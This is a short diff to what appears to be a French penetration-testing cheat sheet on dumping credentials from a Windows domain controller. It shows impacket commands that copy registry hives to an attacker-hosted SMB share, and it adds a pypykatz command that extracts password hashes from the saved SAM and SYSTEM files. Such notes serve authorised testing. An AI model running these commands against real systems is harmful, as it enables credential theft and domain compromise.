@@ -43,6 +43,9 @@ impacket-smbserver share $(pwd) -smb2support
 ```
 impacket-reg "<DOMAIN_NAME>"/"<USER>":"<PASS>"@"<IP-DC>" backup -o '\\<IP-share>\share'
 ```
+```
+pypykatz registry --sam SAM.save SYSTEM.save
+```
 
 ## Methode 3 : diskshadow et robocopy
 ```
